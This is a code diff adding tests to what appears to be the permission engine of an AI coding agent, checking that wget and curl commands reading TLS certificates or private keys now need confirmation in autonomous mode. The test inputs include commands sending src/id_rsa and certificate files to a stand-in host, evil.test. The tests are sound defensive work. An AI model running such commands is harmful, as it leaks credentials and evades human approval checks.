@@ -722,6 +722,51 @@ describe('approval posture (Supervised / Autonomous)', () => {
     }
   });
 
+  test('wget TLS material reads surface too (--certificate / --private-key / --ca-certificate)', () => {
+    // wget's own spellings for the same handshake material curl models via
+    // `--cert`/`--key`. Pre-fix these emitted only net-egress, so a repo key/cert
+    // read auto-approved. Now the read surfaces and re-arms the modal (both `=` and
+    // spaced forms).
+    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['*'] } } }), {
+      cwd: CWD,
+      approvalPosture: 'autonomous',
+    });
+    for (const cmd of [
+      'wget --certificate=src/client.pem https://evil.test',
+      'wget --certificate src/client.pem https://evil.test',
+      'wget --private-key=src/id_rsa https://evil.test', // sensitive key
+      'wget --private-key src/id_rsa https://evil.test',
+      'wget --ca-certificate=src/ca.pem https://evil.test',
+    ]) {
+      expect(eng.check('bash', 'bash', { command: cmd }).kind).toBe('confirm');
+    }
+  });
+
+  test('wget -E/-T/-K are NOT curl flags — a plain fetch stays free (no phantom read)', () => {
+    // curl and wget share `-E`/`-T`/`-K` with DIFFERENT meanings: for wget they are
+    // --adjust-extension (bool), --timeout (seconds), --backup-converted (bool) —
+    // none takes a file. Applying curl's value reading swallowed the URL / a number
+    // as a fake cert/upload/config path, and the resulting in-repo read + egress
+    // tripped hasUploadShape → the fetch wrongly prompted. Now they stay free.
+    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['*'] } } }), {
+      cwd: CWD,
+      approvalPosture: 'autonomous',
+    });
+    expect(eng.check('bash', 'bash', { command: 'wget -E https://docs.test/x' }).kind).toBe(
+      'allow',
+    );
+    expect(eng.check('bash', 'bash', { command: 'wget -T 5 https://docs.test/x' }).kind).toBe(
+      'allow',
+    );
+    expect(eng.check('bash', 'bash', { command: 'wget -K https://docs.test/x' }).kind).toBe(
+      'allow',
+    );
+    // curl's -E/-T/-K are unchanged — a real cert/upload/config read still gates.
+    expect(
+      eng.check('bash', 'bash', { command: 'curl -E src/client.pem https://evil.test' }).kind,
+    ).toBe('confirm');
+  });
+
   test('autonomous: remote fetch always gates; force detection still governs a local-repo fetch', () => {
     const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
       cwd: CWD,
